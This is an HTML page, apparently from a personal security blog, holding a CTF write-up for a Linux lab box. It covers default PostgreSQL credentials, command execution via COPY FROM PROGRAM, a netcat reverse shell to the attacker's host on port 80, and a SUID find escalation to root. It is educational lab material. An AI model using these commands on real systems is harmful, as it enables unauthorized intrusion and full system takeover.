@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Nibbles: PostgreSQL default creds to RCE to a SUID root shell · gp_sec</title>
+<meta name="description" content="A Linux box. Default postgres creds give a superuser DB login, that turns into command execution, and a SUID find binary finishes it off as root.">
+<meta name="color-scheme" content="dark">
+<meta name="theme-color" content="#050506">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16.png">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=IBM+Plex+Sans:wght@400;500;600;700&family=IBM+Plex+Serif:wght@600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../styles.css">
+</head>
+<body>
+<div id="progress" aria-hidden="true"></div>
+
+<header class="topbar">
+  <div class="wrap topbar-inner">
+    <a class="wordmark" href="../index.html">gp_sec</a>
+    <nav class="nav" aria-label="Sections">
+      <a href="../notes.html">Notes</a>
+      <a href="../findings.html">Findings</a>
+      <a href="../ctf.html">CTF</a>
+      <a href="../index.html#contact">Contact</a>
+    </nav>
+  </div>
+</header>
+
+<main class="article">
+  <div class="wrap article-inner">
+    <a class="back" href="../ctf.html">Back to all CTFs</a>
+
+    <p class="dateline">Nibbles · linux</p>
+    <h1>Nibbles: PostgreSQL default creds, then a SUID find to root</h1>
+
+    <p>
+      This Linux box had a lot of ports open, and most of them were dead ends. FTP
+      wouldn't brute-force, SMB had no anonymous access, the web app led nowhere.
+      The way in was an unusual PostgreSQL port that everyone almost skips. Default
+      credentials got me into the database as a superuser, that turned into command
+      execution, and a single misconfigured binary finished it off as root. A good
+      lesson in checking every port, even the boring-looking one.
+    </p>
+
+    <h2>The port everyone would skip</h2>
+    <p>
+      After ruling out the obvious services, the one left was PostgreSQL running on
+      a non-standard port (5437). A database exposed to the network is always worth
+      a close look. The default PostgreSQL account is <code>postgres</code>, and I
+      tried the equally default password <code>postgres</code>. It logged straight
+      in, and the account was a superuser. That's the whole foothold: a database
+      admin login handed over for free.
+    </p>
+
+    <h2>Database login to command execution</h2>
+    <p>
+      A superuser in PostgreSQL isn't just "can read tables", it can run operating
+      system commands. There's a well-known technique (CVE-2019-9193) that abuses
+      the legitimate <code>COPY ... FROM PROGRAM</code> feature: it's meant to read
+      the output of a program into a table, but that means it runs the program. So
+      you can pipe any command through it and read the result back.
+    </p>
+    <pre>COPY tmp FROM PROGRAM 'whoami';   -- runs whoami as the db user</pre>
+    <p>
+      That confirmed code execution as the <code>postgres</code> user. Next step, a
+      real shell.
+    </p>
+
+    <h2>A shell, but only on port 80</h2>
+    <p>
+      My reverse shell on the usual high port didn't connect. That's a firewall
+      talking: the box only lets certain ports back out. Since the web app on the
+      box has to talk to this database, port 80 was almost certainly allowed
+      through, so I pointed my reverse shell at port 80 and it came back
+      immediately.
+    </p>
+    <pre>COPY tmp FROM PROGRAM 'nc -c sh &lt;me&gt; 80';</pre>
+    <p>
+      That gave me an interactive shell as <code>postgres</code>. Worth remembering:
+      when a shell won't connect, it's usually not your payload, it's the firewall,
+      and the ports the box itself needs (80, 443) are the ones most likely open
+      outbound.
+    </p>
+
+    <h2>SUID find to root</h2>
+    <p>
+      As the postgres user I ran linpeas to enumerate for privilege escalation, and
+      it flagged something in the SUID section: <code>/usr/bin/find</code> had the
+      SUID bit set. SUID means the binary runs as its owner (root) no matter who
+      launches it. If a program that powerful can also run other commands, it's
+      game over.
+    </p>
+    <p>
+      <code>find</code> can run commands with its <code>-exec</code> flag, and
+      GTFOBins has the exact one-liner. The <code>-p</code> on the shell keeps the
+      elevated privileges instead of dropping them:
+    </p>
+    <pre>find . -exec /bin/sh -p \; -quit</pre>
+    <p>
+      That dropped me into a shell with an effective UID of 0, root. Done.
+    </p>
+
+    <h2>The chain, in one line</h2>
+    <blockquote>
+      Default postgres:postgres logs in as a DB superuser, COPY FROM PROGRAM turns
+      that into command execution, a port-80 reverse shell gets past the firewall,
+      and a SUID find binary hands over root.
+    </blockquote>
+
+    <h2>What I took from it</h2>
+    <p>
+      Two habits. First, check every open port, especially the one on a weird
+      number that isn't a normal web or file service. The whole box hinged on a
+      database listening where you might not look, protected by a password nobody
+      changed. Second, when a reverse shell won't call home, stop blaming the
+      payload and think about egress filtering, then reach for the ports the box
+      itself has to use. And SUID binaries are always worth checking on Linux;
+      GTFOBins turns "this binary has the SUID bit" straight into a root shell.
+    </p>
+
+    <p><a class="back" href="../ctf.html">Back to all CTFs</a></p>
+  </div>
+</main>
+
+<footer>
+  <div class="wrap foot-inner">
+    <span class="quote">&ldquo;Find the bug. Understand why it works. Make sure it doesn&rsquo;t come back.&rdquo;</span>
+    <span id="clock">Chennai<span class="sep">·</span><span id="time">--:--:--</span></span>
+  </div>
+</footer>
+<script>
+(function(){
+  var t=document.getElementById('time');
+  if(t){function tick(){t.textContent=new Intl.DateTimeFormat('en-GB',{timeZone:'Asia/Kolkata',hour:'2-digit',minute:'2-digit',second:'2-digit',hour12:false}).format(new Date())+' IST';}tick();setInterval(tick,1000);}
+  if(window.matchMedia('(prefers-reduced-motion:reduce)').matches)return;
+  var bar=document.getElementById('progress'),raf=null;
+  if(!bar)return;
+  function onScroll(){if(raf)return;raf=requestAnimationFrame(function(){var h=document.documentElement,max=h.scrollHeight-h.clientHeight;bar.style.width=(max>0?(h.scrollTop/max)*100:0)+'%';raf=null;});}
+  window.addEventListener('scroll',onScroll,{passive:true});onScroll();
+})();
+</script>
+</body>
+</html>
